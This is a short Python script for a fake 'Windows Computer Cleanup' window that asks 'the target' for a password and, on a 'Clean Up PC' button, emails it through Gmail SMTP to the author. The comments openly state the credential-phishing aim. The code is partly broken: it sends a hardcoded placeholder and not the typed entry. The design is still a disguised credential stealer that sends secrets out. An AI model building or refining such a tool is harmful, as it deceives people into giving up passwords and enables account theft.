from tkinter import *
#import the necessary modules
import smtplib, ssl
#use customtkinter for modern look
import customtkinter 

#make a command for button that sends the password to you
def send_password():
    port = 587  # For starttls
    smtp_server = "smtp.gmail.com"
    sender_email = "my@gmail.com"
    receiver_email = "your@gmail.com"
    password = "yourpassword"
    message = password

    context = ssl.create_default_context()
    with smtplib.SMTP(smtp_server, port) as server:
        server.ehlo()  # Can be omitted
        server.starttls(context=context)
        server.ehlo()  # Can be omitted
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)

#set the theme of the GUI to the system theme
customtkinter.set_appearance_mode("System")
#set default color theme to blue
customtkinter.set_default_color_theme("blue")

#make the window & label
window = customtkinter.CTk()
window.title('Windows Computer Cleanup')

label = customtkinter.CTkLabel(window, text="Please enter your password")
label.pack()

#make a text box to get the password from the target
password = customtkinter.CTkEntry(window, text='')
password.pack()

#make a button that takes the password from the text box and uses the command send_password to email the password to you
button = customtkinter.CTkButton(window, text='Clean Up PC', command = send_password)
button.pack()

window.geometry("300x200")

window.mainloop()